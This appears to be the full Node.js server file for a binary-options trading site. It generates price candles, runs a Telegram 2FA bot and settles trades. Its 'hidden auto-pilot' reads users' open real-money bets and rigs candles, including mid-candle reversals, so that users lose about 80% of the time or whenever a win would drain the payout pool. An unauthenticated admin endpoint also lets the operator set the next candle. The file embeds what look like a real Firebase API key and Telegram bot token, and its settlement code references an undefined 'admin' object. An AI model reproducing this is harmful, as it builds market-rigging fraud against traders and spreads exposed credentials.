// --- START: main app server.js (v30 - Perfect Candle Animation, Auto-Pilot & Copy Engine) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// --- Anti-Crash Protection ---
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- SYSTEM CONSTANTS ---
const TIMEFRAME = 60000; 
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 100;
const MAX_CANDLES = 5000;

// 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
const SMART_AUTO_PILOT = true; 
const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin

// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
const POOL_CONFIG = {
    ADMIN_SHARE: 0.70, // 70% to Admin
    USER_SHARE: 0.30   // 30% to Payout Pool
};
let globalPayoutPool = 0;
let globalAdminProfit = 0;

const markets = {}; 
const activeTradesDb = {}; 

// Sync Global Pool from Firebase
db.ref('admin/revenue_pool').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    globalPayoutPool = parseFloat(data.payoutPool) || 0;
    globalAdminProfit = parseFloat(data.adminProfit) || 0;
});

function updateGlobalPoolInDB(payoutChange, adminChange) {
    globalPayoutPool += payoutChange;
    globalAdminProfit += adminChange;
    
    if (globalPayoutPool < 0) globalPayoutPool = 0;
    
    db.ref('admin/revenue_pool').update({
        payoutPool: globalPayoutPool,
        adminProfit: globalAdminProfit
    }).catch(err => console.error("Pool Update Error:", err));
}

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Firebase Listeners ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        const nodeData = fbMarkets[marketId] || {};
        activeTradesDb[marketId] = nodeData.activeTrades || {};
        const type = nodeData.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

// 1. Natural Market Generation
function generateHistoricalCandle(timestamp, open, isLive = false) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    const finalHigh = Math.max(safeOpen, close) + upperWick;
    const finalLow = Math.min(safeOpen, close) - lowerWick;

    if (!isLive) {
        return { timestamp, open: roundPrice(safeOpen), high: roundPrice(finalHigh), low: roundPrice(finalLow), close: roundPrice(close) };
    }

    return {
        timestamp, open: roundPrice(safeOpen), high: roundPrice(safeOpen), low: roundPrice(safeOpen), close: roundPrice(safeOpen),
        isPredetermined: true, isNatural: true, targetHigh: roundPrice(finalHigh), targetLow: roundPrice(finalLow), targetClose: roundPrice(close), pattern: 'NORMAL'
    };
}

// 2. Exact Pattern Generator
function generateDynamicCandle(timestamp, open, command) {
    let bodySize, upperWick, lowerWick, close, high, low;
    const volatility = open * (0.00008 + Math.random() * 0.0001);

    switch (command) {
        case 'GREEN': 
            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'RED': 
            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
        case 'BULLISH_MARUBOZU': 
            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
        case 'BEARISH_MARUBOZU': 
            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
        case 'GREEN_HAMMER': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'RED_HAMMER': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GREEN_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'RED_SHOOTING_STAR': 
            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
        case 'LONG_LEGGED_DOJI': 
            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 3; lowerWick = volatility * 3; break;
        case 'DRAGONFLY_DOJI': 
            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
        case 'GRAVESTONE_DOJI': 
            bodySize = open * 0.000002; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
        case 'GREEN_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open + bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'RED_SPINNING_TOP': 
            bodySize = volatility * 0.4; close = open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
        case 'HUGE_PUMP': 
            bodySize = volatility * 5; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        case 'HUGE_DUMP': 
            bodySize = volatility * 5; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
        default: 
            bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
    }
    
    high = Math.max(open, close) + upperWick;
    low = Math.min(open, close) - lowerWick;

    return {
        timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
        isPredetermined: true, isNatural: false, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice, false); 
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
}

// 🔥 CORE LOGIC: Controls Candle Output
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    if (currentPeriod > lastCandle.timestamp) {
        let newCandle;
        
        if (marketData.nextCandleCommand) {
            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand);
            marketData.nextCandleCommand = null;
        } 
        
        if (!newCandle && SMART_AUTO_PILOT) {
            const trades = activeTradesDb[marketData.marketId] || {};
            let immediateUpVol = 0, immediateDownVol = 0;
            let immediateUpPayout = 0, immediateDownPayout = 0;
            let futureUpVol = 0, futureDownVol = 0;
            const nextPeriod = currentPeriod + TIMEFRAME;
            
            Object.values(trades).forEach(t => {
                const isDemo = t.isDemo === true; 
                const payoutRate = t.payoutRate || 1.85;
                const expectedPayout = t.amount * payoutRate;

                if (!isDemo && !t.isProcessedForPool) {
                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                    updateGlobalPoolInDB(userCut, adminCut);
                    
                    t.isProcessedForPool = true;
                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                }

                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
                    if (t.direction === 'UP') {
                        immediateUpVol += t.amount;
                        if (!isDemo) immediateUpPayout += expectedPayout;
                    }
                    if (t.direction === 'DOWN') {
                        immediateDownVol += t.amount;
                        if (!isDemo) immediateDownPayout += expectedPayout;
                    }
                } else {
                    if (t.direction === 'UP') futureUpVol += t.amount;
                    if (t.direction === 'DOWN') futureDownVol += t.amount;
                }
            });

            // Rule 1: Conflict Resolution
            if (immediateUpVol > 0 || immediateDownVol > 0) {
                let targetDirection = 'DOJI';
                const canAffordUp = immediateUpPayout <= globalPayoutPool;
                const canAffordDown = immediateDownPayout <= globalPayoutPool;

                if (!canAffordUp && !canAffordDown) {
                    targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
                } else if (!canAffordUp) {
                    targetDirection = 'RED';
                } else if (!canAffordDown) {
                    targetDirection = 'GREEN';
                } else {
                    if (Math.random() < ADMIN_WIN_RATIO) {
                        targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
                    } else {
                        targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
                    }
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                
                let payoutChange = 0;
                let adminProfitChange = 0;

                if (targetDirection === 'GREEN') {
                    payoutChange = -immediateUpPayout;
                    adminProfitChange = immediateDownVol;
                } else if (targetDirection === 'RED') {
                    payoutChange = -immediateDownPayout;
                    adminProfitChange = immediateUpVol;
                } else {
                    adminProfitChange = immediateUpVol + immediateDownVol;
                }

                if (payoutChange !== 0 || adminProfitChange !== 0) {
                    updateGlobalPoolInDB(payoutChange, adminProfitChange);
                }
            } 
            // Rule 2: Smart Price Anchoring
            else if (futureUpVol > 0 || futureDownVol > 0) {
                let biggestFutureTrade = null;
                Object.values(trades).forEach(t => {
                    if (t.expiryTimestamp > nextPeriod + 2000 && !t.isDemo) {
                        if (!biggestFutureTrade || t.amount > biggestFutureTrade.amount) {
                            biggestFutureTrade = t;
                        }
                    }
                });

                let driftCommand = 'DOJI';
                
                if (biggestFutureTrade) {
                    const tradeOpenPrice = biggestFutureTrade.openPrice;
                    const currentPrice = lastCandle.close;
                    const isDangerUP = biggestFutureTrade.direction === 'UP' && currentPrice >= (tradeOpenPrice - 0.00002);
                    const isDangerDOWN = biggestFutureTrade.direction === 'DOWN' && currentPrice <= (tradeOpenPrice + 0.00002);

                    const rand = Math.random();

                    if (isDangerUP) {
                        if (rand < 0.60) driftCommand = 'RED'; 
                        else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR';
                        else driftCommand = 'DOJI';
                    } 
                    else if (isDangerDOWN) {
                        if (rand < 0.60) driftCommand = 'GREEN'; 
                        else if (rand < 0.85) driftCommand = 'GREEN_HAMMER';
                        else driftCommand = 'DOJI';
                    } 
                    else {
                        if (rand < 0.40) driftCommand = 'GREEN'; 
                        else if (rand < 0.80) driftCommand = 'RED'; 
                        else driftCommand = 'SPINNING_TOP';
                    }
                } else {
                    driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
                }

                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
            }
        }
        
        if (!newCandle) {
            newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close, true);
        }

        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// 🔥 TICK ENGINE: Fixed Wick Animation Math 🔥
function updateRealisticPrice(marketData, candle, currentPeriod) {
    if (!candle.isPredetermined) return;

    const now = Date.now();
    const timeElapsed = Math.max(0, now - currentPeriod);
    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);

    // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT) {
        candle.isMidEvaluated = true;
        
        const trades = activeTradesDb[marketData.marketId] || {};
        let upVol = 0, downVol = 0;
        let upPayout = 0, downPayout = 0;
        
        Object.values(trades).forEach(t => {
            if (!t.isDemo && !t.isTournament && t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000) {
                const payout = t.amount * (t.payoutRate || 1.85);
                if (t.direction === 'UP') { upVol += t.amount; upPayout += payout; }
                if (t.direction === 'DOWN') { downVol += t.amount; downPayout += payout; }
            }
        });

        if (upVol > 0 || downVol > 0) {
            const canAffordUp = upPayout <= globalPayoutPool;
            const canAffordDown = downPayout <= globalPayoutPool;
            let newTarget = null;
            const volatility = candle.open * 0.0001;

            if (!canAffordUp && !canAffordDown) {
                newTarget = upPayout > downPayout ? 'RED' : 'GREEN';
            } else if (!canAffordUp) {
                newTarget = 'RED';
            } else if (!canAffordDown) {
                newTarget = 'GREEN';
            } else {
                if (Math.random() < ADMIN_WIN_RATIO) {
                    newTarget = upVol > downVol ? 'RED' : 'GREEN';
                }
            }

            if (newTarget) {
                if (newTarget === 'RED' && candle.targetClose >= candle.open) {
                    candle.targetClose = candle.open - volatility - (Math.random() * volatility);
                    candle.targetLow = Math.min(candle.targetLow, candle.targetClose - volatility);
                } else if (newTarget === 'GREEN' && candle.targetClose <= candle.open) {
                    candle.targetClose = candle.open + volatility + (Math.random() * volatility);
                    candle.targetHigh = Math.max(candle.targetHigh, candle.targetClose + volatility);
                }
            }
        }
    }
    // -----------------------------------------------------------------------

    let idealPrice = candle.open;
    const pattern = candle.pattern || 'NORMAL';

    if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
        if (progress < 0.6) {
            idealPrice = candle.open - (candle.open - candle.targetLow) * (progress / 0.6);
        } else {
            idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.6) / 0.4);
        }
    } 
    else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
        if (progress < 0.6) {
            idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.6);
        } else {
            idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetClose) * ((progress - 0.6) / 0.4);
        }
    }
    else if (pattern.includes('DOJI') || pattern.includes('SPINNING_TOP')) {
        if (progress < 0.3) idealPrice = candle.open + (candle.targetHigh - candle.open) * (progress / 0.3);
        else if (progress < 0.7) idealPrice = candle.targetHigh - (candle.targetHigh - candle.targetLow) * ((progress - 0.3) / 0.4);
        else idealPrice = candle.targetLow + (candle.targetClose - candle.targetLow) * ((progress - 0.7) / 0.3);
    }
    else {
        const easeProgress = 1 - Math.pow(1 - progress, 3);
        idealPrice = candle.open + (candle.targetClose - candle.open) * easeProgress;
    }

    const noiseFactor = 1 - Math.pow(progress, 2); 
    const volatility = candle.open * 0.00005;
    const noise = (Math.random() - 0.5) * volatility * noiseFactor;

    marketData.currentPrice = idealPrice + noise;
    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);

    if (timeElapsed >= TIMEFRAME - 1500) {
        marketData.currentPrice = candle.targetClose;
    }

    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
    candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
                }
            }
        } catch (_) {}
    });
});

app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found' });
    }
});

app.post('/api/admin/command', (req, res) => {
    const { marketId, command } = req.body;
    if (!marketId || !command) {
        return res.status(400).json({ error: 'Missing marketId or command' });
    }
    if (markets[marketId]) {
        markets[marketId].nextCandleCommand = command;
        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
        res.json({ success: true, message: `Command ${command} received` });
    } else {
        res.status(404).json({ error: 'Market not found on server' });
    }
});

// Main Loop
let lastSyncTime = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;

    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, currentPeriod); 
        broadcastCandle(marketId, candle);
    }

    if (now - lastSyncTime > 1500) {
        lastSyncTime = now;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.currentPrice) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.currentPrice, timestamp: Date.now() };
            }
        }
        if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Server V30 - Perfect Animations Active'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// ==========================================
// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥
// ==========================================
const https = require('https');
const TELEGRAM_BOT_TOKEN = "8740566281:AAF7MUaumUIrO7IJ7Hr93kG0EzOOHvr444U";
let lastUpdateId = 0;

function sendTelegramMessage(chatId, text) {
    return new Promise((resolve) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' });
        const req = https.request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    if (data.ok && data.result) {
                        resolve(data.result.message_id);
                    } else {
                        resolve(null);
                    }
                } catch (e) {
                    resolve(null);
                }
            });
        });
        req.on('error', (e) => {
            console.error("Telegram Send Error:", e);
            resolve(null);
        });
        req.write(payload);
        req.end();
    });
}

function deleteTelegramMessage(chatId, messageId) {
    if (!messageId) return;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
    const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
    const req = https.request(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    }, (res) => {
        res.on('data', () => {});
    });
    req.on('error', (e) => console.error("Telegram Delete Error:", e));
    req.write(payload);
    req.end();
}

function pollTelegramUpdates() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
    https.get(url, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', async () => {
            try {
                const response = JSON.parse(body);
                if (response.ok && response.result.length > 0) {
                    for (const update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message && update.message.text) {
                            const text = update.message.text.trim();
                            const chatId = update.message.chat.id;
                            const textLower = text.toLowerCase();
                            
                            if (textLower === '/start') {
                                await sendTelegramMessage(chatId, `👋 *Welcome to ICTEX 2FA Verification Bot!*\n\nTo link your Telegram account with your ICTEX trading profile, please go to your profile settings, copy your secure linking code, and paste it here.\n\nCode format: \`XXXXX - XXXXX - XXXXX\``);
                            } 
                            else if (textLower === 'my accounts' || textLower === '/accounts') {
                                try {
                                    const usersSnap = await db.ref('users').once('value');
                                    const users = usersSnap.val() || {};
                                    const matchedAccounts = [];
                                    
                                    for (const [uid, u] of Object.entries(users)) {
                                        if (u && u.telegramChatId == chatId) {
                                            matchedAccounts.push({
                                                email: u.email,
                                                name: u.nickname || u.name || 'Trader',
                                                numericId: u.numericId || uid.substring(0, 8)
                                            });
                                        }
                                    }
                                    
                                    if (matchedAccounts.length > 0) {
                                        let reply = `👤 *Your Linked ICTEX Accounts:*\n\n`;
                                        matchedAccounts.forEach((acc, idx) => {
                                            reply += `${idx + 1}. *${acc.name}* (ID: \`${acc.numericId}\`) - ${acc.email}\n`;
                                        });
                                        await sendTelegramMessage(chatId, reply);
                                    } else {
                                        await sendTelegramMessage(chatId, `❌ *No linked accounts found.*\n\nPlease link your ICTEX account by pasting your secure linking code.`);
                                    }
                                } catch (err) {
                                    console.error("Error fetching linked accounts:", err);
                                    await sendTelegramMessage(chatId, `❌ *Error fetching your accounts.* Please try again later.`);
                                }
                            }
                            else {
                                const codeMatch = text.match(/[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}\s*-\s*[a-zA-Z0-9]{5}/);
                                if (codeMatch) {
                                    const linkCode = codeMatch[0].toUpperCase();
                                    const linkSnap = await db.ref(`telegram_links/${linkCode}`).once('value');
                                    if (linkSnap.exists()) {
                                        const uid = linkSnap.val().uid;
                                        await db.ref(`users/${uid}`).update({
                                            telegramChatId: chatId,
                                            twoFactorEnabled: true
                                        });
                                        await linkSnap.ref.remove();
                                        
                                        await sendTelegramMessage(chatId, `✅ *Account Linked Successfully!*\n\nYour Telegram is now connected to your ICTEX Trade account for 2FA security.`);
                                    } else {
                                        await sendTelegramMessage(chatId, `❌ *Invalid or Expired Code*\n\nPlease make sure you generated a fresh code from your settings and pasted it correctly.`);
                                    }
                                } else {
                                    await sendTelegramMessage(chatId, `ℹ️ *ICTEX Terminal Guide*\n\nI am a secure system bot. I do not understand general conversation.\n\n*Available Actions:*\n• Paste your 15-digit secure code (\`XXXXX - XXXXX - XXXXX\`) to link your account.\n• Type \`my accounts\` to see all accounts linked to this Telegram ID.`);
                                }
                            }
                        }
                    }
                }
            } catch(e) { console.error("Polling parse error:", e); }
            setTimeout(pollTelegramUpdates, 1000); 
        });
    }).on('error', (e) => {
        console.error("Polling connection error:", e);
        setTimeout(pollTelegramUpdates, 3000);
    });
}

function deleteTelegramWebhook() {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`;
    https.get(url, (res) => {
        console.log("Telegram webhook deleted for clean polling.");
        pollTelegramUpdates();
    }).on('error', (e) => {
        console.error("Error deleting webhook, starting polling anyway:", e);
        pollTelegramUpdates();
    });
}
deleteTelegramWebhook();

// Track active OTP transmissions for premium self-destruction
const activeOtps = {};

async function handleNewOtp(uid, chatId, otp, userName) {
    // নতুন ওটিপি পাঠানোর সময় আগের ওটিপি মেসেজটি থাকলে তা চ্যাট থেকে ডিলিট করে দেওয়া হবে
    if (activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) {
            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        }
        delete activeOtps[uid];
    }

    const premiumOtpText = `🔐 *ICTEX VIP Security Alert*\n\nHello *${userName}*,\n\nYour secure verification code is:\n\n\`${otp.code}\`\n\n_This code will expire in 60 seconds. Do not share this transmission._`;
    
    const otpMessageId = await sendTelegramMessage(chatId, premiumOtpText);
    
    activeOtps[uid] = {
        code: otp.code,
        chatId,
        otpMessageId,
        expiresAt: otp.expiresAt
    };

    const duration = 60000;

    activeOtps[uid].timeoutRef = setTimeout(async () => {
        const expiredText = `⚠️ *Security Code Expired*\n\nThe verification code \`${otp.code}\` for *${userName}* has expired. Please request a new one from your terminal.`;
        const expiredMessageId = await sendTelegramMessage(chatId, expiredText);

        // ১০ সেকেন্ড পর ওটিপি মেসেজ এবং এক্সপায়ার নোটিফিকেশন দুটিই চ্যাট থেকে মুছে ফেলার টাইমার
        setTimeout(() => {
            if (otpMessageId) {
                deleteTelegramMessage(chatId, otpMessageId);
            }
            if (expiredMessageId) {
                deleteTelegramMessage(chatId, expiredMessageId);
            }
        }, 10000); 

        db.ref(`users/${uid}/pendingOTP`).remove().catch(() => {});
        delete activeOtps[uid];
    }, duration);
}

// Watch pendingOTP node creation across all users
db.ref('users').on('child_changed', (snapshot) => {
    const uid = snapshot.key;
    const user = snapshot.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        const otp = user.pendingOTP;
        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
        }
    } else if (user && !user.pendingOTP && activeOtps[uid]) {
        if (activeOtps[uid].timeoutRef) clearTimeout(activeOtps[uid].timeoutRef);
        if (activeOtps[uid].otpMessageId) {
            deleteTelegramMessage(activeOtps[uid].chatId, activeOtps[uid].otpMessageId);
        }
        delete activeOtps[uid];
    }
});

db.ref('users').on('child_added', (snapshot) => {
    const uid = snapshot.key;
    const user = snapshot.val();
    if (user && user.pendingOTP && user.telegramChatId) {
        const otp = user.pendingOTP;
        if (!activeOtps[uid] || activeOtps[uid].code !== otp.code) {
            handleNewOtp(uid, user.telegramChatId, otp, user.name || 'User');
        }
    }
});

// ==========================================
// 🔥 ULTIMATE ARBITER: Trade Resolution Engine 🔥
// ==========================================
setInterval(async () => {
    const now = Date.now();
    const allMarketUpdates = {};

    for (const marketId in markets) {
        const marketData = markets[marketId];
        const trades = activeTradesDb[marketId] || {};

        for (const tradeId in trades) {
            const trade = trades[tradeId];

            if (trade.expiryTimestamp && now >= trade.expiryTimestamp && now < trade.expiryTimestamp + 60000) {
                
                const historyCheckSnap = await db.ref(`users/${trade.uid}/tradeHistory/${trade.id}`).once('value');
                if (historyCheckSnap.exists()) {
                    if (!allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`]) allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                    if (!allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`]) allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;
                    continue;
                }

                // Fix: Capture the exact live price at the moment the trade timer ends, 
                // rather than waiting for the entire candle to close, ensuring chart matches history perfectly.
                let closingPrice = marketData.currentPrice;

                if (closingPrice === null || typeof closingPrice !== 'number') continue;

                let result, payout, profitChange;
                const betAmount = parseFloat(trade.amount);
                const openPrice = parseFloat(trade.openPrice);
                const payoutRate = parseFloat(trade.payoutRate) || 1.85;

                const priceDifference = closingPrice - openPrice;
                const pricePrecision = MIN_PRICE / 10;

                if (Math.abs(priceDifference) < pricePrecision) {
                    result = 'push';
                    payout = betAmount;
                    profitChange = 0;
                } else if ((priceDifference > 0 && trade.direction === 'UP') || (priceDifference < 0 && trade.direction === 'DOWN')) {
                    result = 'win';
                    payout = betAmount * payoutRate;
                    profitChange = payout - betAmount;
                } else {
                    result = 'loss';
                    payout = 0;
                    profitChange = -betAmount;
                }
                
                const historyEntry = { ...trade, closePrice: closingPrice, result, payout };
                
                allMarketUpdates[`users/${trade.uid}/tradeHistory/${trade.id}`] = historyEntry;
                allMarketUpdates[`tradeResults/${trade.uid}/${trade.id}`] = { result, pnl: profitChange, amount: betAmount, market: trade.market };

                // Update balances for non-demo trades
                if (!trade.isDemo && !trade.isTournament) {
                    // ✅ Normal Trading uses Real/Bonus Wallet
                    if (result === 'win') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(payout);
                    } else if (result === 'push') {
                        allMarketUpdates[`users/${trade.uid}/realBalance`] = admin.database.ServerValue.increment(trade.realAmount);
                        allMarketUpdates[`users/${trade.uid}/bonusBalance`] = admin.database.ServerValue.increment(trade.bonusAmount);
                    }
                    allMarketUpdates[`users/${trade.uid}/totalProfitLoss`] = admin.database.ServerValue.increment(profitChange);
                    allMarketUpdates[`users/${trade.uid}/dailyProfit`] = admin.database.ServerValue.increment(profitChange);
                }

                // Cleanup active trades
                allMarketUpdates[`admin/markets/${marketId}/activeTrades/${tradeId}`] = null;
                allMarketUpdates[`users/${trade.uid}/activeTrades/${tradeId}`] = null;

                console.log(`[ARBITER] Resolved trade ${tradeId} for user ${trade.uid}. Result: ${result}`);
            }
        }
    }

    if (Object.keys(allMarketUpdates).length > 0) {
        db.ref().update(allMarketUpdates).catch(e => console.error("Arbiter update failed:", e));
    }
}, 2000);